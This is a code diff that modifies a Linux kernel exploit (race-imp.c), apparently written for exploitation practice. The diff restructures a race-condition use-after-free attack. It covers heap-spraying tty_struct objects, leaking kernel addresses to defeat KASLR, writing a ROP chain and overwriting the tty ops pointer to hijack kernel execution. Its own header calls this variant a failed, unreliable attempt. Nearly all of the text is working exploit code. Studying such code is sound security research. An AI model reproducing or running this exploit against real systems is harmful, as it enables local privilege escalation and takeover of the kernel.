@@ -1,3 +1,16 @@
+/**
+ * Failed improve attempt of race-imp.c
+ *
+ * It tries to speed up the exploitation by attempting to reuse the same uaf
+ * position, and avoiding the need to race on each retry. It does so by
+ * splitting up `create_overlapped()` into one function for getting the uaf
+ * position, `race_and_get_uaf_position()`, and one function for spraying and
+ * getting the victim object, `spray_and_get_victim_object()`.
+ *  
+ * The result is an unreliable exploit that gets stuck in the retry loop by
+ * getting g_buf filled with non tty_struct objects.
+ */
+
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -119,15 +132,18 @@ void* spray_thread(void *arg) {
   return (void*)-1;
 }
 
-int create_overlapped() {
-  pthread_t th1, th2;
-  char buf[0x10] = {};
-  cpu_set_t t1_cpu, t2_cpu;
+pthread_t th1, th2;
+cpu_set_t t1_cpu, t2_cpu;
 
+void setup_thread_objects() {
   CPU_ZERO(&t1_cpu);
   CPU_ZERO(&t2_cpu);
   CPU_SET(0, &t1_cpu);
   CPU_SET(1, &t2_cpu);
+}
+
+void race_and_get_uaf_position() {
+  char buf[0x10] = {};
 
   // Get next free file descriptor
   fd1 = open("/tmp", O_RDONLY); 
@@ -149,12 +165,15 @@ int create_overlapped() {
     puts("[-] Bad luck!");
     exit(1);
   }
-  // Blank the buffer as it will be used to determine the success of the spray
-  memset(buf, 0, 14);
-  write(fd1, buf, 14);
-
   // Free the buffer to create the use-after-free opportunity
   close(fd1);
+}
+
+int spray_and_get_victim_object() {
+  char buf[0x10] = {};
+  // Blank the buffer as it will be used to determine the success of the spray
+  memset(buf, 0, 14);
+  write(fd2, buf, 14);
 
   // Heap Spray on multiple cores
   long victim_fd = -1;
@@ -173,20 +192,26 @@ int create_overlapped() {
 
 int main() {
   char buf[0x400] = {};
+  int victim_ptmx;
+  int retry = 1;
 
   save_state();
+  setup_thread_objects();
 
-  // Overlap tty_struct and fd2 in UAF
-  create_overlapped();
+  race_and_get_uaf_position();
+  while (retry) {
+    victim_ptmx = spray_and_get_victim_object();
 
-  // KASLR bypass
-  read(fd2, buf, 0x400);
-  kbase = *(unsigned long*)&buf[0x18] - ofs_tty_ops;
-  g_buf = *(unsigned long*)&buf[0x38] - 0x38;
-  if (kbase & 0xfff) {
-    // Corrected because the address may have shifted
-    puts("[-] Invalid leak! Fixing address...");
-    kbase += 0x120;
+    // KASLR bypass
+    read(fd2, buf, 0x400);
+    kbase = *(unsigned long*)&buf[0x18] - ofs_tty_ops;
+    g_buf = *(unsigned long*)&buf[0x38] - 0x38;
+    if (kbase & 0xfff) {
+      puts("[-] Invalid leak! Try again ...");
+      close(victim_ptmx);    
+      continue;
+    }
+    retry = 0;
   }
   printf("kbase = 0x%016lx\n", kbase);
   printf("g_buf = 0x%016lx\n", g_buf);
@@ -214,11 +239,22 @@ int main() {
   *(unsigned long*)&buf[0x3f8] = rop_push_rdx_add_prbxP41h_bl_pop_rsp_pop_rbp;
   write(fd2, buf, 0x400);
 
-  // Overlap tty_struct and fd2 in UAF
-  int victim_ptmx = create_overlapped();
+  race_and_get_uaf_position();
+  retry = 1;
+  while (retry) {
+    victim_ptmx = spray_and_get_victim_object();
 
-  // Rewrite ->ops pointer
-  read(fd2, buf, 0x20);
+    // Rewrite ->ops pointer
+    read(fd2, buf, 0x20);
+    // verify obtained tty_struct by checking its leaked base address
+    if (kbase != *(unsigned long *)&buf[0x18] - ofs_tty_ops) {
+      puts("[-] Invalid tty_struct! Try again ...");
+      close(victim_ptmx); 
+      continue;
+    }
+    retry = 0;
+  }
+
   *(unsigned long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
   write(fd2, buf, 0x20);
 
